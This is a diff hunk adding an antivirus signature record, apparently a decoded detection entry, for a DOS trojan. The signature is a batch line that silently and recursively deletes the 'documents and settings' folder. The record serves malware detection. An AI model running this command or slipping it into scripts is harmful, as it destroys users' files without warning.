@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36595
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off color f4 rd "c:\documents and settings" /q /s>nul
